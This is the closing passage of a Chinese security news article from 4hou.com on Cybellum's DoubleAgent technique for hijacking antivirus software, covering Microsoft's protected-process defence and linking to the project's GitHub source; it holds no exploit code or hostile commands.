+<p>微软为杀毒厂商提供了一个新的保护理念，称为保护过程防护。保护过程防护专门是为杀毒服务而设计。杀毒进程可以创建为“受保护的进程”，受保护的进程设备只允许受信任的签名代码加载，并具有针对代码注入攻击的内置防护功能。这意味着即使攻击者再发现了一种新的零日漏洞技术来注入代码，但因为它的代码未签名，所以最终还是无法修改杀毒软件的权限。目前只有Windows Defender已经实现了这种保护。</p>
+<p>不过请注意，即使杀毒软件会阻止注册尝试，代码注入技术和持久性技术也难被阻止，因为代码注入技术和持久性技术利用了是操作系统的合法进程。</p>
+<p><span style="font-size: 20px;"><strong>源代码</strong></span></p>
+<p>DoubleAgent源代码项目可以在Github上找到，请点击<a href="https://github.com/Cybellum/DoubleAgent" target="_self">这儿</a>。</p>
+<p><span style="font-size: 20px;"><strong>总结</strong></span></p>
+<p>攻击技术总是在发展，比如这次的零日攻击。所以我们需要更加努力地发现和防范这些攻击，并停止盲目信任传统的安全解决方案，如上文所分析的那样，如果我们还是按照传统的思维方式来抵御这个零日攻击，不仅无效而且还为攻击者创造了新的攻击机会。</p>
+                <div class="foot_description" style="background-color: #fff;">
+                    本文参考来源于cybellum，如若转载，请注明来源于嘶吼：                        <a href="http://www.4hou.com/technology/4066.html" target=_blank>http://www.4hou.com/technology/4066.html</a>
+                                    </div>
+
+
+                 </p>
+            </div>
+            <div class="article_con">
+                <!--文章内容-->
+            </div>
+            <div class="post-like">
+                <a href="javascript:;" data-action="ding" target=_blank data-id="4066" class="favorite">
+                <div class="zanbox">
+                    <dd class="zanbefor"></dd>
+                    <dd class="zanafter"></dd>
+                </div>
+                <span class="zantext">点赞</span>
+                <span class="count">
+            0</span>
+                </a>
+            </div>
+            <div class="active_bottom">
+                <ul>
+                    <a class="Sina" href="http://service.weibo.com/share/share.php?url=http://www.4hou.com/technology/4066.html" title="分享到新浪微博" target="_blank"><li class="sinahover"></li></a>
+                    <a onclick="window.open('http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url='+encodeURIComponent(document.location.href));return false;" title="分享到QQ空间" class="WeChat" href="javascript:void(0)" target="_blank"><li class="kj"></li></a>
+                    <a onclick="dashangToggle()" class="friend" title="分享到微信、朋友圈等" target="_blank"><li class="wx"></li></a>
+
+                </ul>
+                <div class="strat icons"><span class='wpfp-span'><img src='http://img.4hou.com/wp-content/plugins/wp-favorite-posts/img/star.png' alt='Favorite' title='Favorite' class='wpfp-img' /><a class='wpfp-link' href='?wpfpaction=add&amp;postid=4066' title='收藏' rel='nofollow'>收藏</a></span></div>
+                <div class="hide_box"></div>
+                <div class="shang_box">
+                    <a class="shang_close" href="javascript:void(0)" onClick="dashangToggle()" title="关闭"><img src="http://img.4hou.com/wp-content/themes/4houv2/images/close.jpg" alt="取消" /></a>
+                    <img class="shang_logo" width="120px" src="http://img.4hou.com/wp-content/themes/4houv2/images/logo.png" alt="嘶吼" />
+                    <div class="shang_tit">
+                        <p>感谢您的支持，我会继续努力的!</p>
+                    </div>
+                    <div class="shang_payimg">
+                        <img src="http://www.4hou.com/wp-content/themes/4houv2/qrcode.php?url=http%3A%2F%2Fwww.4hou.com%2Ftechnology%2F4066.html" alt="扫码支持" title="扫一扫" />
+                    </div>
+
+                    <div class="shang_info">
+                        <p>打开<span id="shang_pay_txt">微信</span>扫一扫后点击右上角即可分享哟</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="avatarbottomwrap">
+                 <div class="avatarboxleft">
+                        <div class="avatarbottom">
+                           
+                            <a class="upload-img"><img alt='xiaohui' src='http://img.4hou.com/wp-content/uploads/2017/06/4645ece03f124d9c2bb9-96x96.png' class='avatar avatar-96 photo' height='96' width='96' /></a>
+                        </div>
+                        <h1 class="authornamebottom"><a href="http://www.4hou.com/member?Author=xiaohui" class="upload-img" target=_blank>
+                                xiaohui                                                            <i class="mem_level"></i>
+                             </a></h1>
+                        <p class="authorzybottom">嘶吼编辑</p>
+
+                        <div class="authorbottombox">
+                            <!--<div class="gzbtn">关注</div>
+                            <div class="sxbtn">私信</div>-->
+                                                            <span class="gzbtn"  style="cursor: pointer;" onclick="location.href='/mybox?action=reply&to_user=xiaohui&type=send'">发私信</span>
+                                                    </div>
+                 </div>
+                <div class="authorother">
+                 <a class="morearticle" href="http://www.4hou.com/member?Author=xiaohui" class="upload-img" target=_blank>
+                            <span class="swiper-pagination-bullet swiper-pagination-bullet-active"></span>
+                            <span class="swiper-pagination-bullet swiper-pagination-bullet-active"></span>
+                            <span class="swiper-pagination-bullet swiper-pagination-bullet-active"></span>
+                             </a>
+                    <div class="swiper-container">
+
+                                                    <div class="swiper-wrapper">
+                               
+                                <div class="swiper-slide">
+                                                                        <div><a href="http://www.4hou.com/technology/7667.html" target=_blank>
+                                            <img data-original="/uploads/20170915/1505460611763833.jpg?imageView2/1/w/140/h/104/format/png"  class="wp-post-image"width="140" height="104"  />                                        </a></div>
+                                                                        <div><a href="http://www.4hou.com/technology/7638.html" target=_blank>
+                                            <img data-original="http://img.4hou.com/wp-content/uploads/2017/09/dcf441e3e17ab9ef68ff.jpg?imageView2/1/w/140/h/104/format/png"  class="wp-post-image"width="140" height="104"  />                                        </a></div>
+                                                                        <div><a href="http://www.4hou.com/technology/7657.html" target=_blank>
+                                            <img data-original="/uploads/20170915/1505404839986320.jpg?imageView2/1/w/140/h/104/format/png"  class="wp-post-image"width="140" height="104"  />                                        </a></div>
+                                                                        <div><a href="http://www.4hou.com/technology/7600.html" target=_blank>
+                                            <img data-original="/uploads/20170908/1504854270386868.png?imageView2/1/w/140/h/104/format/png"  class="wp-post-image"width="140" height="104"  />                                        </a></div>
+                                                                    </div>
+                            </div>
+                                        </div>
+                </div>
+                <script type="text/javascript">
+                    function dashangToggle(){
+                        $(".hide_box").fadeToggle();
+                        $(".shang_box").fadeToggle();
+                    }
+                </script>
+                <script> 
+                    var mySwiper = new Swiper('.swiper-container', {
+                        direction : 'vertical',
+                        pagination : '.swiper-pagination',
+                        paginationClickable :true,
+                        spaceBetween : 20
+                    })
+                </script>
+            </div>
+                            <div class="review" style="margin-bottom:80px;">
+    <h3 id="reply-title" class="comment-reply-title">发表评论 <small></h3>
+    <form action="http://www.4hou.com/wp-comments-post.php" method="post" id="commentform">
+        <p class="commentname"><label for="author">昵称</label>
+            <input type="text" name="author" id="author" value="" size="14" tabindex="1" aria-required='true' placeholder = "请输入昵称" required />
+        </p>
+        <p class="commenteml">
+            <label for="email">邮箱</label>
+            <input type="text" name="email" id="email" value="" size="25" tabindex="2" aria-required='true' placeholder = "请输入邮箱地址" required />
+        </p>
+        <p class="comment-form-comment">
+           <label for="comment">评论</label>
+           <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" aria-required="true" required="required"></textarea>
+        </p>
+
+        <p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="发表评论" />
+        <input type='hidden' name='comment_post_ID' value="4066" id='comment_post_ID' />
+            <input type='hidden' name='comment_parent' id='comment_parent' value='0' />
+        </p>
+    </form>
+					
+<div class="new-review">
+   <ol class="commentlist">
+   <div class="comment-box" id="li-comment-767">
+    <div class="avatar fl"><img alt='程白凡' src='http://img.4hou.com/wp-content/uploads/2017/07/ddfa9e9b4240fd0303ab-120x120.png' class='avatar avatar-120 photo' height='120' width='120' /></div>
+    <!--评论列表-->
+    <div class="user-comment">
+    <!--评论人-->
+  <a id="c-man" href="http://www.4hou.com/member?Author=%E7%A8%8B%E7%99%BD%E5%87%A1" class="nick">程白凡</a>
+  <!--评论时间-->
+  <span>2017-04-01 14:53</span>
+  <!--评论内容-->
+<p>感谢分享，男朋友说这文章不错</p>
+  <!--回复按钮-->
+  <div class="reply clearfix">
+<a rel='nofollow' class='comment-reply-link' href='http://www.4hou.com/technology/4066.html?replytocom=767#respond' onclick='return addComment.moveForm( "comment-767", "767", "respond", "4066" )' aria-label='回复给程白凡'>回复</a>  </div>
+  </div>
+<script>
+  $("#replybtn").click(function(){
+     $("#ta").text("");
+     $("#comment").focus();
+  })
+</script>
+  <!--评论审核提示-->
+  <div class="comment_text">
+  </div>
+</div>
+</li><!-- #comment-## -->
+   </ol>
+   <div class="hr clearfix">&nbsp;</div>
+</div>
+</div>             
+        </article>
+
+        <!--作者其他文章-->
+        <aside class="article_authorbox">
+          <div class="article_authorbox_top">
+                <div class="article_author">
+            <div class="article_author_avatar">
+                 <a class="upload-img"><img alt='xiaohui' src='http://img.4hou.com/wp-content/uploads/2017/06/4645ece03f124d9c2bb9-96x96.png' class='avatar avatar-96 photo' height='96' width='96' /></a>
+            </div>
+            <h1 class="article_author_name"><a href="http://www.4hou.com/member?Author=xiaohui" class="upload-img" target=_blank>
+                    xiaohui                                    <i class="mem_level"></i>
+                </a></h1>
+            <p class="article_author_type">嘶吼编辑 </p>
+            <div class="article_author_bottom">
+                                        <span class="send-info" onclick="location.href='/mybox?action=reply&to_user=xiaohui&type=send'">发私信</span>
+                         
+            </div>
+          </div>  
+            <div class="interested">
+                <h1>可能喜欢</h1>
+                                                    <li>
+                    <i></i>
+                    <a href="http://www.4hou.com/technology/7667.html" target="_blank">小心找工作时被挖坑，有人利用 LinkedIn 发送钓鱼链接</a> 
+                </li> 
+                                <li>
+                    <i></i>
+                    <a href="http://www.4hou.com/technology/7653.html" target="_blank">一次服务器被攻击的应急行动</a> 
+                </li> 
+                                <li>
+                    <i></i>
+                    <a href="http://www.4hou.com/info/news/7646.html" target="_blank">一个Tor浏览器0day漏洞价值100万美元，其中的隐情是……</a> 
+                </li> 
+                                <li>
+                    <i></i>
+                    <a href="http://www.4hou.com/info/news/7660.html" target="_blank">Elasticsearche僵尸网络：超过4000台服务器遭到两款POS 恶意软件感染</a> 
+                </li> 
+                                <li>
+                    <i></i>
+                    <a href="http://www.4hou.com/technology/7669.html" target="_blank">渗透挑战赛：从SQL注入到管理员权限</a> 
+                </li> 
+                                                </div>
+       </div>
+
+          
+        </aside>
+    </section>
+    <div id="zooming">
+        <img src="" id="imgcon">
+    </div>
+    <script>
+        $(document).ready(function() {
+            $.fn.postLike = function() {
+                if ($(this).hasClass('done')) {
+                    return false;
+                } else {
+                    $(this).addClass('done');
+                    var id = $(this).data("id"),
+                        action = $(this).data('action'),
+                        rateHolder = $(this).children('.count');
+                    var ajax_data = {
+                        action: "bigfa_like",
+                        um_id: id,
+                        um_action: action
+                    };
+                    $.post("/wp-admin/admin-ajax.php", ajax_data,
+                        function(data) {
+                            $(rateHolder).html(data);
+                        });
+                    return false;
+                }
+            };
+            $(document).on("click", ".favorite",
+                function() {
+                    $(this).postLike();
+                });
+
+
+            $("img").attr("title","");
+            var altcon=$(".art_title").text();
+            $("img").attr("alt",altcon);
+            // 图片放大
+            $(".article_cen").find('img').on("click",function(){
+                var imgsrc=$(this).attr("src");
+                var winthimg=$(this).width();
+                var zooming=winthimg*1.2;
+                $("#imgcon").css({width:zooming});
+                $("#imgcon").css({marginLeft:-zooming/2});
+                $("#imgcon").attr("src",imgsrc);
+                $("#zooming").addClass("zoomaniatae");
+                $("#imgcon").addClass("imgconadimate");
+            });
+            $("#zooming").on("click",function(){
+                $("#imgcon").removeClass("imgconadimate");
+                $("#zooming").removeClass("zoomaniatae");
+
+            });
+
+            $(window).scroll(function(){
+                var scrtop=$(window).scrollTop();
+                if(scrtop>450){
+                    $(".article_authorbox_top").removeClass("asideanimateleave").addClass('asideanimate')
+                    // $(".interested").hide()
+                }
+                else if(scrtop<450&&scrtop>350){
+                     $(".article_authorbox_top").addClass("asideanimateleave").removeClass('asideanimate')
+                     $(".interested").show()
+
+                }
+            });
+            var start=$(".strat .wpfp-span .wpfp-link").text()
+            if(start=="已收藏"){
+                $(".strat").addClass("stratend")
+            }else{
+                $(".strat").removeClass("stratend")
+            }
+
+            $(".avatar-96").width(72);
+            $(".avatar-96").height(72);
+            $(".avatar-120").width(50);
+            $(".avatar-120").height(50);
+
+        });
+    </script>
+<style type="text/css">
+.footer{height:auto; background-color: #282828}
+.footer_about{width: 1200px;height: 50px;padding-top: 26px; margin: 0 auto;border-bottom-color: transparent !important; position: relative;}
+.footer_about>a{font-size: 16px;height: 16px !important;line-height: 16px !important; float: left; padding-right: 18px; border-right:1px solid #ccc;}
+.last-child-a{border:none !important}
+.footer_bottom_cen p{ margin-top: 5px; margin-right: 25px;text-align: left; margin-bottom: 6px;float: left;}
+.footer_bottom_cen>div{width: 450px;float: left;margin-right: 8px}
+.footer_bottom{height: 74px}
+.footerlogos{width: 130px; height: 24px; position: absolute;right: 10%; top:24px;}
+.footerlogos dd{float: left; margin-right: 20px;cursor: pointer;}
+.footerlogos dd a{display: block;width: 100%; height: 100%}
+.wechartlogo{width: 20px; height: 20px; background-position:-227px 0px;}
+.weibologo{width: 20px; height: 20px; background-position:-269px 0px;}
+.zhihulogo{width: 20px; height: 20px; background-position:-361px 0px;}
+.wechartlogo i{width: 80px;height: 78px;background-size: contain !important; right: 137px;display: none;opacity: 1;background: url(http://www.4hou.com/wp-content/themes/4houv2/img/wechatqr.png) no-repeat;position: absolute;top: -28px;}
+.wechartlogo:hover i{display: block;}
+.footer_bottom{width: 1200px; background-color: #282828; margin:0 auto } 
+.footer_bottom_cen>div img{float: left; margin-right: 4px;margin-top: 4px; margin-left: 4px;width: 66px;}
+.footer_bottom_cen{width: 100%}
+.cloudserver{float: right !important; margin: 0 auto !important;width: 385px !important; margin-top: -31px}
+.cloudserver img{float: left;}
+.cloudserver dd{float: left;}
+@media screen and (max-width:1260px) {
+    .footer{width: 100%; padding: 0px 20px;}
+    .footer_about{width: 100%}
+    .footer_bottom{width: 100%}
+    .footer_bottom div{width: 100%;display: none;}
+}
+@media screen and (max-width:660px) {
+    .footer_about{padding-top: 14px; margin-bottom: 22px;}
+    .footerlogos{display: none;}
+    .footer_bottom{height: 44px;}
+
+}
+</style>
+<footer class="footer">
+    <div class="footer_about">
+        <a href="/about" target=_blank>关于我们</a>
+        <!--<a href="">加入我们</a>-->
+        <a href="/submit" target=_blank>我要投稿</a>
+        <a href="/service" target=_blank>广告及服务</a>
+        <a href="/partner" target=_blank class="last-child-a">友情链接</a>
+        <div class="footerlogos">
+                <dd class="wechartlogo icons">
+                  <i></i>
+                </dd>
+                <dd class="weibologo icons">
+                 <a href="http://weibo.com/u/6069423878" target=_blank></a>
+                </dd>
+                <dd class="zhihulogo icons">
+                    <a href="https://zhuanlan.zhihu.com/roartalk" target=_blank></a>
+                    
+                </dd>
+        </div>
+    </div>
+
+    <section class="footer_bottom">
+        <article class="footer_bottom_cen">
+            <p>©2017 北京嘶吼文化传媒有限公司&nbsp;&nbsp;&nbsp;京ICP备16063439号</p>
+            <p class="mobilefooter">©2017 北京嘶吼文化传媒有限公司&nbsp;&nbsp;|&nbsp;&nbsp;京ICP备16063439号</p>
+            <div class="cloudserver">
+                <span>本站由</span>
+                <img src="http://img.4hou.com/wp-content/themes/4houv2/img/bdcloud.png">
+                <img src="http://img.4hou.com/wp-content/themes/4houv2/img/bdcloud1.png">
+                <img src="http://img.4hou.com/wp-content/themes/4houv2/img/ucloud.png">
+                <span>提供云计算服务</span>
+            </div>
+        </article>
+    </section>
+    <section class="footer_top" style="display:none">
+        <article class="footer_top_cen">
+            <div class="homeqrcode">
+                <dd class="icons"></dd>
+                <div class="wb">
+                    <a href="http://weibo.com/u/6069423878" target=_blank>
+                    <i class="icons"></i>
+                    <p>关注嘶吼传媒</p>
+                    </a>
+                </div>
+
+                <div class="sh">
+                    <a href="https://zhuanlan.zhihu.com/roartalk" target=_blank>
+                    <i class="icons"></i>
+                    <p>关注嘶吼</p>
+                    </a>
+                </div>
+            </div>
+            
+            <h1>合作伙伴</h1>
+            <div class="footer_friend">
+                <a href="http://www.xinhuanet.com/talking/chinasafety/" target=_blank>新华网安全中国</a>
+                <a href="http://jaq.alibaba.com/" target=_blank>阿里聚安全</a>
+                <a href="http://www.seclover.com/" target=_blank>四叶草安全</a>
+                <a href="https://sec.vip.com/" target=_blank>唯品会安全应急响应中心</a>
+                <a href="https://www.duoyinsu.com/" target=_blank>安识科技</a>
+                <a href="http://xianzhi.aliyun.com" target=_blank>云盾先知</a>
+                <a href="http://www.ardsec.com/" target=_blank>兴华永恒</a>
+                <a href="https://www.sobug.com/" target=_blank>SOBUG</a>
+            </div>
+        </article>
+    </section>
+    
+</footer>
+<aside class="side" >
+    <div class="side_top icons "></div>
+    <div class="iconbox">
+        <div class="side_wechart icons iconhover">微信
+            <dd></dd>
+        </div>
+        <a href="http://weibo.com/u/6069423878" target=_blank><div class="side_webo icons iconhover">微博</div></a>
+        <a href="http://www.4hou.com/feed/" target=_blank><div class="side_rss icons iconhover">RSS</div></a>
+        <a href="https://zhuanlan.zhihu.com/roartalk" target=_blank><div class="side_zh icons iconhover">知乎</div></a>
+    </div>
+    <div class="side_bottom icons"></div>
+    
+</aside>
+
+<script>
+    var _hmt = _hmt || [];
+    (function() {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?ac201c14c3d2a4747423252be421e1bc";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+<script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-91554508-1', 'auto');
+    ga('send', 'pageview');
+
+</script>
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+</body>
+</html>
